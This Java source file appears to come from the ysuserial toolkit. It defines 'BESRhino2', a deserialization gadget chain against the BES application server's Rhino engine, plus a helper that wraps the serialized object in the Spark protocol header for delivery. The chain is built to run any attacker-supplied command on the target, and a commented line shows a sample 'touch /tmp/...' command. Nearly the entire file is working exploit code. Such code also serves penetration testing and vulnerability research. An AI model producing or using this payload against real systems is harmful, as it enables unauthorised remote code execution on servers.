package org.su18.ysuserial.payloads.gadgets;

import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Gadgets;
import org.su18.ysuserial.payloads.util.PayloadRunner;

import com.bes.ejb.spark.tcp.marshal.SparkJavaMarshaller;
import com.bes.org.mozilla.javascript.*;
import org.su18.ysuserial.payloads.util.Reflections;

import java.io.*;
import java.lang.reflect.Method;
import java.util.Hashtable;
import java.util.Map;

@Dependencies({"com.bes.ejb.spark"})
@Authors({Authors.DEMO})
public class BESRhino2 implements ObjectPayload<Object> {

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(BESRhino2.class, args);
    }

    public static final byte[] PROTOCOL = new byte[]{83, 112, 97, 114, 107};
    public static void customWriteAdapterObject(Object javaObject, ObjectOutputStream out) throws IOException {
        out.writeObject("java.lang.Object");
        out.writeObject(new String[0]);
        out.writeObject(javaObject);
    }

    private byte major = 0;
    private byte minor = 0;

    public Object getObject(final String command) throws Exception {

        final Object template = Gadgets.createTemplatesImpl(command);
//        final Object template = Gadgets.createTemplatesImpl("touch /tmp/1231231111");
        ScriptableObject dummyScope = new NativeArray(10);
        Map<Object, Object> associatedValues = new Hashtable<Object, Object>();
        associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
        Reflections.setFieldValue(dummyScope, "associatedValues", associatedValues);


        Object initContextMemberBox = Reflections.createWithConstructor(
                Class.forName("com.bes.org.mozilla.javascript.MemberBox"),
                (Class<Object>)Class.forName("com.bes.org.mozilla.javascript.MemberBox"),
                new Class[] {Method.class},
                new Object[] {Context.class.getMethod("enter")});


        ScriptableObject initContextScriptableObject = new NativeArray(10);
        Method makeSlot = ScriptableObject.class.getDeclaredMethod("accessSlot", String.class, int.class, int.class);
        Reflections.setAccessible(makeSlot);
        Object slot = makeSlot.invoke(initContextScriptableObject, "foo", 0, 4);
        Reflections.setFieldValue(slot, "getter", initContextMemberBox);


        NativeJavaObject initContextNativeJavaObject = new NativeJavaObject();
        Reflections.setFieldValue(initContextNativeJavaObject, "parent", dummyScope);
        Reflections.setFieldValue(initContextNativeJavaObject, "isAdapter", true);
        Reflections.setFieldValue(initContextNativeJavaObject, "adapter_writeAdapterObject",
                this.getClass().getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));
        Reflections.setFieldValue(initContextNativeJavaObject, "javaObject", initContextScriptableObject);

        ScriptableObject scriptableObject = new NativeArray(10);
        scriptableObject.setParentScope(initContextNativeJavaObject);
        makeSlot.invoke(scriptableObject, "outputProperties", 0, 2);


        NativeJavaArray nativeJavaArray = Reflections.createWithoutConstructor(NativeJavaArray.class);
        Reflections.setFieldValue(nativeJavaArray, "parent", dummyScope);
        Reflections.setFieldValue(nativeJavaArray, "javaObject", template);
        nativeJavaArray.setPrototype(scriptableObject);
        Reflections.setFieldValue(nativeJavaArray, "prototype", scriptableObject);


        NativeJavaObject nativeJavaObject = new NativeJavaObject();
        Reflections.setFieldValue(nativeJavaObject, "parent", dummyScope);
        Reflections.setFieldValue(nativeJavaObject, "isAdapter", true);
        Reflections.setFieldValue(nativeJavaObject, "adapter_writeAdapterObject",
                this.getClass().getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));
        Reflections.setFieldValue(nativeJavaObject, "javaObject", nativeJavaArray);

//        serialize(nativeJavaObject);
        return nativeJavaObject;

    }

    public void serialize(Object o) throws Exception {
        SparkJavaMarshaller sparkJavaMarshaller = new SparkJavaMarshaller();
        byte[] responseBody = sparkJavaMarshaller.marshal(o);
        byte[] responsebytes = new byte[18 + responseBody.length];
        byte[] header = getHeader(100, responseBody.length);
        System.arraycopy(header, 0, responsebytes, 0, 18);
        System.arraycopy(responseBody, 0, responsebytes, 18, responseBody.length);

//        new FileOutputStream("3.ser").write(responsebytes);
    }

    public byte[] getHeader(int requestId, int length) {
        byte[] header = new byte[18];
        this.fillHeader(requestId, length, header);
        return header;
    }

    public void fillHeader(int requestId, int length, byte[] message) {
        System.arraycopy(PROTOCOL, 0, message, 0, PROTOCOL.length);
        message[5] = this.toByteValue();
        message[6] = (byte)(requestId >> 24);
        message[7] = (byte)(requestId >> 16);
        message[8] = (byte)(requestId >> 8);
        message[9] = (byte)requestId;
        message[10] = (byte)(length+4 >> 24);
        message[11] = (byte)(length+4 >> 16);
        message[12] = (byte)(length+4 >> 8);
        message[13] = (byte)(length+4 >> 0);
        message[14] = 7;
        message[15] = 1;
        message[16] = (byte) ((length >> 8) & 0xFF);
        message[17] = (byte) (length & 0xFF);
    }
    public byte toByteValue() {
        return (byte)(this.major << 4 | this.minor);
    }

}
